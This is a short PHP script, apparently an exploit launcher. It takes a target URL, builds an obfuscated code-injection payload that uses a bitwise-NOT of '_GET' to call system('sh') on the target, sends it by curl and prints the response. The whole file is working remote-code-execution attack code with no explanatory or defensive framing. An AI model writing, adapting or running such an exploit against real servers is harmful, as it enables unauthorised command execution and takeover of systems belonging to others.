<?php
if (isset($_GET['target'])) {
  $payload = ~'_GET';

  $payloadToSend = '${~'.$payload.'}{0}(\'sh\')';


  $targetUrl = $_GET['target'] . '?code=' . urlencode($payloadToSend);
  $targetUrl = $targetUrl . '&0=system';
  $ch = curl_init($targetUrl);
  // curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  // curl_setopt($ch, CURLOPT_POST, true);
  // curl_setopt($ch, CURLOPT_POSTFIELDS, ['payload' => $payloadToSend]);
  $response = curl_exec($ch);
  curl_close($ch);

  echo $response;
} else {
  echo "Parameter 'target' is required.";
}
?>
